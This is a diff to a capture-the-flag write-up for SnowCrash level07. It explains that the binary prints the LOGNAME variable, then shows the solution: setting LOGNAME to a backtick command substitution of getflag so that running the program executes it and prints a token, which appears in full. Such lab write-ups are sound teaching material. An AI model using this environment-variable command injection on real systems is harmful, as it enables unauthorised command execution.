@@ -12,7 +12,8 @@ main()
 decompiling the binary with binary ninja, we get the upper code
 it shows that the program prints the variable LOGNAME
 
-level07@SnowCrash:~$ export LOGNAME=$\(getflag\)
-level07@SnowCrash:~$ ./level07
+```
+export LOGNAME=\`getflag\`
+./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-
+```
